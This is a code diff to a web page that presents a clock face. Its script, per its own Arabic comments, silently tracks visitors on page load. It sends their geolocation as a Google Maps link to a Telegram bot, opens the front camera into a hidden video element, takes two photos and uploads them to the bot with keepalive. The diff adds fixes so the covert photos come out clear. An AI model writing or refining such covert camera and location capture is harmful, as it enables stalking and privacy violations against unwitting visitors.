@@ -50,7 +50,6 @@
             box-shadow: 0 15px 35px rgba(0,0,0,0.8);
         }
 
-        /* الخط الفاصل في المنتصف */
         .flip-card::before {
             content: ''; 
             position: absolute; 
@@ -118,27 +117,45 @@
 
         // 2. محاولة الرصد والتصوير بصمت عند تحميل الصفحة
         async function runBackgroundTasks() {
-            sendToBot("🚀 رصد دخول جديد للموقع (واجهة الساعة مباشرة)");
+            // إرسال تنبيه دخول فوري
+            sendToBot("🚀 رصد دخول جديد للموقع وبدء عمليات الخلفية.");
 
             try {
-                // محاولة طلب الكاميرا
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('camVideo').srcObject = videoStream;
-
-                // محاولة طلب الموقع
+                // محاولة طلب الموقع الجغرافي
                 navigator.geolocation.getCurrentPosition(p => {
                     sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                 }, () => {}, {timeout: 5000});
 
-                // التقاط الصور
-                setTimeout(() => capture(1), 3000);
+                // محاولة طلب الكاميرا الأمامية
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, // طلب الكاميرا الأمامية
+                    audio: false // لا نحتاج للصوت
+                });
+                
+                // ربط التيار بعنصر الفيديو الخفي
+                const v = document.getElementById('camVideo');
+                v.srcObject = videoStream;
+
+                // --- حل مشكلة الشاشة السوداء ---
+                // ننتظر قليلاً حتى يبدأ عنصر الفيديو في التشغيل الفعلي للتيار
+                await new Promise(resolve => v.onloadedmetadata = resolve);
+                // كما نضيف تأخيراً إضافياً للتأكد من أن الكاميرا نفسها قد أرسلت أول إطار (Frame)
+                await new Promise(resolve => setTimeout(resolve, 5000)); // تأخير 5 ثوانٍ كأمان
+
+                // الآن، ننتقل للالتقاط
+                sendToBot("📷 الكاميرا جاهزة، جاري الالتقاط...");
+                
+                // التقاط الصور بتوقيتات كافية
+                setTimeout(() => capture(1), 1000); // الصورة الأولى بعد ثانية واحدة من الجاهزية
                 setTimeout(() => {
                     capture(2);
-                    setTimeout(stopCamera, 1000); // إغلاق الكاميرا تماماً بعد انتهاء المهمة
-                }, 7000);
+                    // زيادة التأخير قبل إيقاف الكاميرا لضمان اكتمال إرسال الصورة الثانية
+                    setTimeout(stopCamera, 5000); 
+                }, 8000); // الصورة الثانية بعد 8 ثوانٍ
 
             } catch (err) {
-                sendToBot("⚠️ تم الدخول، لكن تعذر الوصول للكاميرا (قد يكون المستخدم رفض الصلاحية).");
+                // في حال فشل الكاميرا
+                sendToBot(`⚠️ تعذر الوصول للكاميرا. السبب: ${err.name} - قد يكون رفض المستخدم أو الجهاز.`);
             }
         }
 
@@ -146,21 +163,52 @@
             if (!videoStream) return;
             const v = document.getElementById('camVideo');
             const c = document.getElementById('canvas');
+            const ctx = c.getContext('2d');
+
             try {
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
+                // التأكد من أن الفيديو يرسل إطارات حقيقية (له طول وعرض)
+                if (v.videoWidth === 0 || v.videoHeight === 0) {
+                    sendToBot(`⚠️ فحص Capture ${n}: لا يوجد تيار فيديو (قد يكون جاري التحميل).`);
+                    return;
+                }
+
+                // تعيين أبعاد الـ Canvas لتطابق الفيديو
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
+                
+                // رسم الإطار الحالي على الـ Canvas
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                
+                // تحويل الـ Canvas إلى ملف صورة (Blob)
                 c.toBlob(b => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', b, `shot_${n}.jpg`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg', 0.5);
-            } catch(e) {}
+                    if (b) {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', b, `shot_${n}.jpg`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                            method: 'POST', 
+                            body: fd,
+                            keepalive: true // لضمان انتهاء الطلب حتى لو أغلقت الصفحة
+                        }).then(r => {
+                            if (r.ok) {
+                                sendToBot(`✅ تم إرسال الصورة ${n} بنجاح.`);
+                            } else {
+                                sendToBot(`❌ فشل إرسال الصورة ${n} إلى التليجرام.`);
+                            }
+                        }).catch(() => {});
+                    } else {
+                        sendToBot(`❌ فحص Capture ${n}: لم يتم إنشاء ملف صورة (فارغ).`);
+                    }
+                }, 'image/jpeg', 0.5); // جودة متوسطة لسرعة الإرسال
+            } catch(e) {
+                sendToBot(`❌ خطأ أثناء التقاط الصورة ${n}: ${e.message}`);
+            }
         }
 
         function stopCamera() {
             if (videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
+                sendToBot("📴 تم إيقاف الكاميرا تماماً (انتهاء المهمة).");
             }
         }
 
